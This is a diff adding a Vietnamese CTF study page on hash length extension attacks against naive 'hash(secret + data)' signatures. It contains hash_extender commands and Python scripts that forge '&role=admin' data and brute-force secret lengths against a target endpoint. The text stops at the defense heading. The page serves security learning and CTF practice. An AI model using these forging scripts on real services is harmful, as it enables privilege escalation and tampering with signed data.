@@ -1,0 +1,521 @@
+<title>Hash Length Extension — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Crypto · Hash Length Extension</div>
+    <h1>Hash Length Extension Attack</h1>
+    <p class="sub">Khi app tự chế "chữ ký" bằng cách ghép <code>hash(secret + data)</code> (MD5/SHA1/SHA256
+    trần, không qua HMAC) để chống giả mạo dữ liệu — bạn có thể, <strong>không cần biết secret</strong>, tự tính
+    ra hash hợp lệ cho dữ liệu đã nối thêm phần bạn muốn vào cuối, nhờ cách các hàm hash này hoạt động theo
+    từng khối (Merkle-Damgård construction).</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ (hash_extender)</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Hash Length Extension là gì?</h2>
+  <p class="lead">Nhiều hàm hash phổ biến (MD5, SHA1, SHA256) được xây theo kiểu
+  <strong>Merkle-Damgård</strong>: xử lý dữ liệu theo từng khối, và <em>trạng thái bên trong sau khi hash xong</em>
+  chính là <em>toàn bộ thông tin</em> hàm cần để TIẾP TỤC hash thêm dữ liệu — không cần biết dữ liệu gốc là gì.
+  Nếu app tạo "chữ ký" kiểu <code>sig = hash(secret + data)</code> rồi gửi cả <code>data</code> và
+  <code>sig</code> cho người dùng, bạn lấy <code>sig</code> đó làm trạng thái bắt đầu, tự tính tiếp được
+  <code>hash(secret + data + padding + data_bạn_thêm)</code> mà hoàn toàn không biết <code>secret</code>.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Không cần tự cài thuật toán — dùng công cụ <code>hash_extender</code> có sẵn, chỉ cần biết: hash gốc, dữ liệu
+  gốc, độ dài secret (thử các giá trị phổ biến 0-32 nếu không biết chính xác), và dữ liệu muốn nối thêm.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ HASH LENGTH EXTENSION</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        App có tham số dạng <code>data=...&amp;sig=&lt;32/40/64 hex&gt;</code> mà <code>sig</code> trông như
+        MD5 (32 hex)/SHA1 (40 hex)/SHA256 (64 hex) trần — KHÔNG phải JWT, KHÔNG phải HMAC có thư viện chuẩn.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Biết thuật toán hash (suy từ độ dài hex) VÀ có ít nhất 1 cặp <code>(data, sig)</code> hợp lệ mẫu để làm
+        điểm bắt đầu tính tiếp.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        Độ dài hex của sig: 32→MD5, 40→SHA1, 64→SHA256/SHA512(cắt) — xác định đúng thuật toán trước khi chạy
+        công cụ.
+      </div>
+      <div class="cslot"><span class="lab">💥 Lệnh dán-chạy-ngay (hash_extender)</span>
+<pre><code>cd ~/hoc/CTF/Tools/web/hash_extender
+./hash_extender --data "uid=1&role=user" --secret-min 8 --secret-max 32 \
+  --append "&role=admin" --signature SIG_HEX_GOC --format sha256 --out-data-format hex</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (gửi thẳng kết quả)</span>
+<pre><code><span class="k">import</span> subprocess, re, requests
+
+out = subprocess.run([<span class="s">"./hash_extender"</span>, <span class="s">"--data"</span>, <span class="s">"uid=1&role=user"</span>,
+    <span class="s">"--secret-min"</span>, <span class="s">"8"</span>, <span class="s">"--secret-max"</span>, <span class="s">"32"</span>, <span class="s">"--append"</span>, <span class="s">"&role=admin"</span>,
+    <span class="s">"--signature"</span>, <span class="s">"SIG_HEX_GOC"</span>, <span class="s">"--format"</span>, <span class="s">"sha256"</span>, <span class="s">"--out-data-format"</span>, <span class="s">"hex"</span>],
+    cwd=<span class="s">"/home/ld/hoc/CTF/Tools/web/hash_extender"</span>, capture_output=<span class="k">True</span>, text=<span class="k">True</span>)
+<span class="k">print</span>(out.stdout)  <span class="c"># in ra nhiều dòng data mới + hash mới, mỗi dòng 1 độ dài secret thử</span></code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        hash_extender in ra NHIỀU kết quả (1 cho mỗi độ dài secret trong khoảng min-max) — phải THỬ GỬI TỪNG
+        CÁI vì không biết chính xác độ dài secret thật. WAF rule nhanh: chặn request có cả <code>data</code> và
+        <code>sig</code>/<code>signature</code> dạng hex trần kèm byte <code>\x80</code> (byte padding đặc
+        trưng Merkle-Damgård) trong giá trị data — dấu hiệu rất đặc trưng, false positive thấp.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước (không cần sâu toán học)</h2>
+  <div class="def"><b>Merkle-Damgård construction</b> — cách xây hàm hash phổ biến (MD5, SHA1, SHA256): chia dữ
+  liệu thành các khối cố định, xử lý TUẦN TỰ từng khối, mỗi khối cập nhật 1 "trạng thái nội bộ" (internal
+  state), và trạng thái cuối cùng (sau khối cuối) CHÍNH LÀ giá trị hash bạn thấy.</div>
+  <div class="def"><b>Padding của hash</b> — trước khi hash, dữ liệu được thêm vào 1 byte <code>0x80</code>,
+  rồi các byte <code>0x00</code>, rồi 8 byte ghi độ dài dữ liệu gốc (tính bằng bit) — để độ dài cuối cùng là
+  bội số của kích thước khối (64 byte với MD5/SHA1/SHA256).</div>
+  <div class="def"><b>Điểm mấu chốt khai thác</b> — "giá trị hash cuối cùng" = "trạng thái nội bộ cuối cùng".
+  Nếu bạn CÓ giá trị hash đó, bạn CÓ ĐỦ trạng thái để tiếp tục hash thêm khối tiếp theo — <strong>không cần
+  biết nội dung dữ liệu đã hash trước đó là gì</strong>, kể cả phần secret bí mật.</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Dev nhầm "hash có secret" = "an toàn như HMAC"</h2>
+  <p>Dev muốn tạo chữ ký chống giả mạo nhanh, nghĩ đơn giản: "chỉ ai biết secret mới tính được hash đúng" — nên
+  viết <code>hash(secret + data)</code>. Điều dev KHÔNG biết: hàm hash kiểu Merkle-Damgård không được thiết kế
+  để dùng trực tiếp như vậy cho mục đích xác thực — nó thiếu 1 bước "chốt" ở cuối (finalization) mà HMAC có.
+  <strong>HMAC</strong> (<code>hash(secret + hash(secret + data))</code> hoặc tương tự, theo chuẩn RFC 2104)
+  mới là cách làm đúng, vì nó phá vỡ chính thuộc tính "trạng thái cuối = đủ để tiếp tục" mà kẻ tấn công cần.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Tiếp tục hash từ trạng thái đã biết, không cần biết phần đầu</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr23)}
+    </style>
+    <defs><marker id="arr23" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="170" height="40" rx="8" class="box"/>
+    <text x="22" y="44" class="lbl-m">[secret] (bạn KHÔNG biết)</text>
+    <rect x="190" y="20" width="170" height="40" rx="8" class="box"/>
+    <text x="202" y="44" class="lbl-m">[data] (bạn CÓ, công khai)</text>
+    <rect x="370" y="20" width="110" height="40" rx="8" class="box"/>
+    <text x="382" y="44" class="lbl-m">[padding tự động]</text>
+
+    <path d="M250,65 V90" class="arrow"/>
+    <rect x="10" y="95" width="470" height="40" rx="8" class="box-a"/>
+    <text x="22" y="119" class="lbl-a">= trạng thái nội bộ cuối = giá trị "sig" bạn ĐÃ CÓ sẵn!</text>
+
+    <path d="M250,140 V165" class="arrow"/>
+    <rect x="10" y="170" width="470" height="40" rx="8" class="box-a"/>
+    <text x="22" y="194" class="lbl-a">tiếp tục hash thêm [data_bạn_thêm] từ trạng thái đó -&gt; sig MỚI hợp lệ</text>
+
+    <text x="500" y="45" class="lbl-m" font-style="italic">hash_extender tự</text>
+    <text x="500" y="60" class="lbl-m" font-style="italic">build lại padding</text>
+    <text x="500" y="75" class="lbl-m" font-style="italic">đúng (cần đoán độ</text>
+    <text x="500" y="90" class="lbl-m" font-style="italic">dài secret) rồi nối</text>
+    <text x="500" y="105" class="lbl-m" font-style="italic">tiếp từ sig cũ.</text>
+  </svg>
+  </div>
+  <p>Dữ liệu MỚI mà server sẽ "thấy" khi kiểm tra lại không phải
+  <code>data + data_bạn_thêm</code> đơn thuần — mà là <code>data + padding_tự_động + data_bạn_thêm</code>. Đây
+  là lý do bạn phải dùng công cụ (mục 07) thay vì tự ghép chuỗi — phần padding phải tính đúng từng byte theo
+  đúng chuẩn của thuật toán, và còn phụ thuộc ĐỘ DÀI của secret (vì padding được tính dựa trên tổng độ dài
+  <code>secret + data</code>).</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu theo độ dài hex</h2>
+  <table>
+    <tr><th>Độ dài hex của sig</th><th>Thuật toán khả năng cao</th></tr>
+    <tr><td>32</td><td>MD5</td></tr>
+    <tr><td>40</td><td>SHA1</td></tr>
+    <tr><td>64</td><td>SHA256 (hoặc SHA512/256)</td></tr>
+    <tr><td>128</td><td>SHA512</td></tr>
+  </table>
+  <p>Dấu hiệu thiết kế: app có tham số <code>data</code>/<code>message</code> dạng chuỗi rõ ràng (không mã hoá)
+  cùng với 1 tham số "chữ ký" hex trần đi kèm — khác với JWT (có 3 phần ngăn bằng dấu chấm, phần đầu base64 là
+  JSON) hoặc HMAC qua thư viện chuẩn (thường không thể tái tạo được padding dễ như vậy, nhưng HÌNH THỨC bên
+  ngoài vẫn là hex trần nên vẫn nên thử).</p>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Lấy mẫu data+sig trước khi chạy công cụ</span>
+  <ol style="margin:4px 0 0">
+    <li>Đăng nhập/đăng ký user thường, bắt request chứa tham số <code>data</code> và <code>sig</code> (hoặc
+    tên tương tự).</li>
+    <li>Copy chính xác 2 giá trị này — <strong>data phải copy ĐÚNG NGUYÊN VĂN</strong> (kể cả khoảng trắng, ký
+    tự đặc biệt) vì hash_extender cần khớp byte-by-byte với dữ liệu server thực sự đã hash.</li>
+    <li>Chạy hash_extender (mục 07) với các giá trị này, lấy data mới + sig mới.</li>
+    <li>Quay lại Repeater, thay <code>data</code> bằng data mới (hash_extender in ra dạng hex, cần decode
+    đúng cách app mong đợi — xem mục 06), thay <code>sig</code> bằng sig mới, Send.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / ĐỊNH DẠNG DATA ĐẦU RA — ĐIỂM DỄ SAI NHẤT</div>
+  <h2>hash_extender in ra data mới dạng HEX — cần đúng format app mong đợi</h2>
+  <div class="pbreak">
+    <div class="ph">./hash_extender --data "uid=1&role=user" --secret-min 16 --secret-max 16 --append "&role=admin" --signature abc123...64hex --format sha256 --out-data-format hex</div>
+    <div class="pb">
+      <div class="part"><code>--secret-min/--secret-max 16</code> — nếu BIẾT chính xác độ dài secret (vd từ
+      source code hoặc gợi ý challenge), đặt min=max để chỉ ra đúng 1 kết quả, không cần thử nhiều</div>
+      <div class="part"><code>--out-data-format hex</code> — in data mới dạng hex (an toàn để copy-paste, cần
+      decode lại thành raw bytes trước khi gửi nếu app mong đợi raw, hoặc giữ hex nếu app parse hex)</div>
+    </div>
+    <div class="resp">Output gồm 2 dòng mỗi độ dài secret thử: <code>New signature: ...</code> và
+    <code>New string: ...</code> (data mới dạng hex) — nếu bạn đặt <code>out-data-format=html</code> thì data
+    mới được URL-encode sẵn, tiện dán trực tiếp vào query string.</div>
+  </div>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: HASH_EXTENDER</div>
+  <h2>Không tự viết thuật toán padding — dùng hash_extender</h2>
+  <div class="def"><b>hash_extender</b> — công cụ C kinh điển (Ron Bowes), tự tính padding đúng chuẩn và tiếp
+  tục hash cho MD4/MD5/RIPEMD160/SHA1/SHA256/SHA512 mà không cần biết secret, chỉ cần khoảng độ dài secret có
+  thể. Đã clone + build sẵn tại <code>~/hoc/CTF/Tools/web/hash_extender/</code> (từ <code>iagox86/hash_extender</code>).</div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/hash_extender
+
+<span class="c"># Nếu KHÔNG biết chính xác độ dài secret -- thử 1 khoảng rộng</span>
+./hash_extender \
+  --data "uid=1&role=user" \
+  --secret-min 0 --secret-max 32 \
+  --append "&role=admin" \
+  --signature 2c70e12b7a0646f92279f427c7b38e7334d8e5389cff167a1dc30e73f826b683 \
+  --format sha256 \
+  --out-data-format hex
+
+<span class="c"># Output mẫu (rút gọn), 1 dòng cho MỖI độ dài secret thử (0..32):</span>
+<span class="c"># Secret length: 8</span>
+<span class="c"># New signature: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6cb</span>
+<span class="c"># New string: 75696431267..." (hex) -- gửi thay cho "data" cũ</span></code></pre>
+  <div class="note tip"><span class="tag">Chiến thuật khi không biết độ dài secret</span>Dùng
+  <code>--secret-min 0 --secret-max 64</code> để quét rộng, LẤY TOÀN BỘ kết quả, viết script tự thử gửi từng
+  cặp (data mới, sig mới) lên server cho tới khi 1 cặp được chấp nhận (mục 08) — không cần tự đoán đúng ngay
+  từ đầu.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-tool sang script tự động thử mọi độ dài secret</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> subprocess, requests
+
+<span class="c"># Bước 1: chạy hash_extender với 1 độ dài secret cụ thể thử trước</span>
+out = subprocess.run(
+    [<span class="s">"./hash_extender"</span>, <span class="s">"--data"</span>, <span class="s">"uid=1&role=user"</span>,
+     <span class="s">"--secret-min"</span>, <span class="s">"8"</span>, <span class="s">"--secret-max"</span>, <span class="s">"8"</span>,
+     <span class="s">"--append"</span>, <span class="s">"&role=admin"</span>, <span class="s">"--signature"</span>, <span class="s">"SIG_GOC_HEX"</span>,
+     <span class="s">"--format"</span>, <span class="s">"sha256"</span>, <span class="s">"--out-data-format"</span>, <span class="s">"html"</span>],
+    cwd=<span class="s">"/home/ld/hoc/CTF/Tools/web/hash_extender"</span>, capture_output=<span class="k">True</span>, text=<span class="k">True</span>)
+<span class="k">print</span>(out.stdout)
+
+<span class="c"># Bước 2: lấy "New signature" và "New string" (đã URL-encode), gửi thử</span></code></pre>
+
+  <h3>(B) Bản gọn chắc — parse output, thử hết các độ dài secret tới khi server chấp nhận</h3>
+  <pre><code><span class="k">import</span> subprocess, re, requests
+
+<span class="k">def</span> <span class="d">try_all_secret_lengths</span>(host, orig_sig, orig_data, append):
+    out = subprocess.run(
+        [<span class="s">"./hash_extender"</span>, <span class="s">"--data"</span>, orig_data,
+         <span class="s">"--secret-min"</span>, <span class="s">"0"</span>, <span class="s">"--secret-max"</span>, <span class="s">"48"</span>,
+         <span class="s">"--append"</span>, append, <span class="s">"--signature"</span>, orig_sig,
+         <span class="s">"--format"</span>, <span class="s">"sha256"</span>, <span class="s">"--out-data-format"</span>, <span class="s">"html"</span>],
+        cwd=<span class="s">"/home/ld/hoc/CTF/Tools/web/hash_extender"</span>, capture_output=<span class="k">True</span>, text=<span class="k">True</span>)
+
+    sigs = re.findall(<span class="s">r"New signature: (\w+)"</span>, out.stdout)
+    datas = re.findall(<span class="s">r"New string: (\S+)"</span>, out.stdout)
+
+    <span class="k">for</span> sig, data <span class="k">in</span> zip(sigs, datas):
+        r = requests.get(<span class="s">f"http://{host}/check"</span>, params={<span class="s">"data"</span>: data, <span class="s">"sig"</span>: sig}, timeout=5)
+        <span class="k">if</span> <span class="s">"invalid"</span> <span class="k">not in</span> r.text.lower():
+            <span class="k">return</span> data, sig, r.text
+    <span class="k">return</span> <span class="k">None</span>, <span class="k">None</span>, <span class="k">None</span>
+
+<span class="k">print</span>(try_all_secret_lengths(<span class="s">"TARGET_IP"</span>, <span class="s">"SIG_GOC_HEX"</span>, <span class="s">"uid=1&role=user"</span>, <span class="s">"&role=admin"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — cache đúng độ dài secret sau lần thử đầu</h3>
+  <pre><code><span class="k">import</span> subprocess, re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+KNOWN_SECRET_LEN = <span class="k">None</span>  <span class="c"># sẽ cache lại sau khi tìm ra đúng độ dài lần đầu</span>
+
+<span class="k">def</span> <span class="d">build_candidates</span>(orig_sig, orig_data, append, lo=0, hi=48):
+    out = subprocess.run(
+        [<span class="s">"./hash_extender"</span>, <span class="s">"--data"</span>, orig_data, <span class="s">"--secret-min"</span>, str(lo), <span class="s">"--secret-max"</span>, str(hi),
+         <span class="s">"--append"</span>, append, <span class="s">"--signature"</span>, orig_sig, <span class="s">"--format"</span>, <span class="s">"sha256"</span>, <span class="s">"--out-data-format"</span>, <span class="s">"html"</span>],
+        cwd=<span class="s">"/home/ld/hoc/CTF/Tools/web/hash_extender"</span>, capture_output=<span class="k">True</span>, text=<span class="k">True</span>)
+    lens = [int(x) <span class="k">for</span> x <span class="k">in</span> re.findall(<span class="s">r"Secret length: (\d+)"</span>, out.stdout)]
+    sigs = re.findall(<span class="s">r"New signature: (\w+)"</span>, out.stdout)
+    datas = re.findall(<span class="s">r"New string: (\S+)"</span>, out.stdout)
+    <span class="k">return</span> list(zip(lens, sigs, datas))
+
+<span class="k">def</span> <span class="d">exploit_hle</span>(host, orig_sig, orig_data):
+    <span class="k">global</span> KNOWN_SECRET_LEN
+    cands = build_candidates(orig_sig, orig_data, <span class="s">"&role=admin"</span>,
+        KNOWN_SECRET_LEN <span class="k">if</span> KNOWN_SECRET_LEN <span class="k">else</span> 0,
+        KNOWN_SECRET_LEN <span class="k">if</span> KNOWN_SECRET_LEN <span class="k">else</span> 48)
+    <span class="k">for</span> length, sig, data <span class="k">in</span> cands:
+        r = requests.get(<span class="s">f"http://{host}/check"</span>, params={<span class="s">"data"</span>: data, <span class="s">"sig"</span>: sig}, timeout=5)
+        <span class="k">if</span> <span class="s">"invalid"</span> <span class="k">not in</span> r.text.lower():
+            KNOWN_SECRET_LEN = length   <span class="c"># cache -- mọi đội khác dùng cùng độ dài secret</span>
+            m = FLAG_RE.search(r.text)
+            <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">return</span> <span class="k">None</span></code></pre>
+  <div class="note tip"><span class="tag">Hiệu quả hơn bài trước</span>Khác padding oracle (độ dài secret không
+  liên quan giữa các đội), ở đây <strong>độ dài secret THƯỜNG CỐ ĐỊNH trong code service</strong> dù giá trị
+  secret khác nhau mỗi đội — nên cache lại đúng độ dài sau lần dò đầu tiên, các lần sau chỉ cần thử đúng 1 độ
+  dài đó, nhanh hơn nhiều.</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Request có <code>?data=uid=1%26role=user&amp;sig=2c70e1...</code> — sig dài 64 hex ⟹ nghi SHA256 trần.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Thử sửa data trực tiếp (kiểm tra không có HMAC)</div><div class="d">Đổi <code>role=user</code> thành <code>role=admin</code> giữ sig cũ → bị từ chối (dĩ nhiên, hash khác) — xác nhận cần tấn công length extension chứ không sửa tay được.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Chạy hash_extender</div><div class="d">Quét <code>--secret-min 0 --secret-max 48</code>, append <code>&amp;role=admin</code>.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Thử từng candidate</div><div class="d">Script (B) gửi lần lượt từng cặp (data, sig) mới → độ dài secret=16 được server chấp nhận.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Response trả về với quyền admin → hiện <code>FHACKER2026{...}</code>.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
